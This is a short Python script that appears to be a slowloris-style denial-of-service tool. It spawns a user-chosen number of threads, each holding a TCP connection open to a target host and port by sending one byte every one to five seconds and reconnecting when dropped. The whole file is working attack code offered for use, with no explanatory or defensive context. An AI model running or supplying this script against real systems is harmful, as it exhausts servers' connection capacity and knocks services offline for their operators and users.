import socket
import time
import random
import threading
import sys


def est_connection(thread_id, host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connected = False
	while True:
		if(not connected):
			try:
				s.connect((host, port))
				connected = True
			except:
				pass
		else:
			try:
				s.send(b'.')
				print("[{}]\t sending byte.".format(thread_id))
				time.sleep(random.randrange(1000,5000)/1000)
			except:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				connected = False
				pass
	s.close()


try:
	host = sys.argv[1]
	port = int(sys.argv[2])
	connections = int(sys.argv[3])
except:
	print("Error: invalid input.")
	if len(sys.argv) < 4:
		print("Must provide [host, port, #connections]")

for i in range(connections):
	t = threading.Thread(target=est_connection, args=(i,host,port))
	t.start()
	